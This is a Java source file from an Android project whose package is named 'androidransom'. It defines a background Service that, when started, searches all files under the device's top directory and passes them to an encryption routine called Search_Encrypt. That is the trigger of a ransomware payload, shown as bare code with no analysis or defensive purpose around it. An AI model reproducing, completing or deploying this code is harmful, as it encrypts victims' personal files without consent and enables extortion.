package bycracks.androidransom;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;


public class MyService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "start service", Toast.LENGTH_SHORT).show();
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "onStartCommand Start", Toast.LENGTH_SHORT).show();

        Search_Encrypt tool = new Search_Encrypt();
        tool.searchAllFile(tool.getTopDir());
        try {
            tool.encodeProcess();
        } catch (Exception e) {
            e.getMessage();
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service end", Toast.LENGTH_SHORT).show();
    }

}
